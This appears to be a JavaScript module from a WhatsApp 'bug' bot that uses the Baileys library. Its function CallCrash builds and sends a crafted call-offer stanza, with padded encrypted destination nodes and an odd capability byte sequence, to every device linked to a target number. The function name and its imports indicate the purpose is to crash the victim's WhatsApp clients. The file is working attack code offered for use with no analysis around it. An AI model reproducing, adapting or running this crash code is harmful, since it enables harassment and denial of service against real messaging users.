const { relayCrashToDevices } = require('../target-utils');
/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function CallCrash(SYxS7, target) {
  let devices = [];
  try {
    if (typeof SYxS7.getUSyncDevices === 'function') {
      devices = (
        await SYxS7.getUSyncDevices([target], false, false, SYxS7.authState)
      ).map(({ user, device }) => `${user}:${device || ""}@s.whatsapp.net`);
    } else {
      const user = target.split('@')[0];
      devices = [`${user}:0@s.whatsapp.net`, target];
    }
  } catch (e) {
    const user = target.split('@')[0];
    devices = [`${user}:0@s.whatsapp.net`, target];
  }

  if (typeof SYxS7.assertSessions === 'function') {
    try { await SYxS7.assertSessions(devices); } catch (e) {}
  }

  const locks = {};
  const mutex = async (jid, task) => {
    locks[jid] ??= Promise.resolve();
    locks[jid] = locks[jid].catch(() => {}).then(task);
    return locks[jid];
  };

  const pad = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);

  const originalCreateParticipantNodes = SYxS7.createParticipantNodes?.bind(SYxS7);

  SYxS7.createParticipantNodes = async (
    recipients,
    message,
    encAttrs,
    overrideMessage
  ) => {
    if (!recipients || !recipients.length) {
      return { nodes: [], shouldIncludeDeviceIdentity: false };
    }

    const patched =
      (await SYxS7.patchMessageBeforeSending?.(message, recipients)) ?? message;

    const messages = Array.isArray(patched)
      ? patched
      : recipients.map(jid => ({
          recipientJid: jid,
          message: patched
        }));

    const myJid = SYxS7.authState?.creds?.me?.id || SYxS7.user?.id || '';
    const lid = SYxS7.authState?.creds?.me?.lid || null;
    const linkedUser = lid ? jidDecode(lid)?.user : null;

    let includeDeviceIdentity = false;

    const nodes = await Promise.all(
      messages.map(async ({ recipientJid, message }) => {
        const recipientUser = jidDecode(recipientJid)?.user || recipientJid;
        const myUser = jidDecode(myJid)?.user || myJid;

        const isSelf = recipientUser === myUser || recipientUser === linkedUser;

        if (overrideMessage && isSelf && recipientJid !== myJid) {
          message = overrideMessage;
        }

        const encoded = pad(
          SYxS7.encodeWAMessage
            ? SYxS7.encodeWAMessage(message)
            : encodeWAMessage(message)
        );

        return mutex(recipientJid, async () => {
          let type = 'pkmsg';
          let ciphertext = encoded;

          if (SYxS7.signalRepository?.encryptMessage) {
            try {
              const res = await SYxS7.signalRepository.encryptMessage({
                jid: recipientJid,
                data: encoded
              });
              type = res.type;
              ciphertext = res.ciphertext;
            } catch (e) {}
          }

          if (type === "pkmsg") includeDeviceIdentity = true;

          return {
            tag: "to",
            attrs: { jid: recipientJid },
            content: [
              {
                tag: "enc",
                attrs: { v: "2", type, ...encAttrs },
                content: ciphertext
              }
            ]
          };
        });
      })
    );

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity: includeDeviceIdentity
    };
  };

  // 6. Create encrypted destination nodes
  const { nodes, shouldIncludeDeviceIdentity } =
    await SYxS7.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: "0" }
    );

  const selfId = SYxS7.user?.id || SYxS7.authState?.creds?.me?.id || target;

  // 7. Build CALL OFFER stanza
  const callNode = {
    tag: "call",
    attrs: {
      to: target,
      id: typeof SYxS7.generateMessageTag === 'function' ? SYxS7.generateMessageTag() : 'CALL123',
      from: selfId
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
          "call-creator": selfId
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              enc: "vp8",
              dec: "vp8",
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          {
            tag: "destination",
            attrs: {},
            content: nodes
          },
          ...(shouldIncludeDeviceIdentity && SYxS7.authState?.creds?.account
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    SYxS7.authState.creds.account,
                    true
                  )
                }
              ]
            : [])
        ]
      }
    ]
  };

  // 8. Send the call offer
  if (typeof SYxS7.sendNode === 'function') {
    await SYxS7.sendNode(callNode);
  }

  // Restore original function
  if (originalCreateParticipantNodes) {
    SYxS7.createParticipantNodes = originalCreateParticipantNodes;
  }
}

module.exports = { CallCrash };
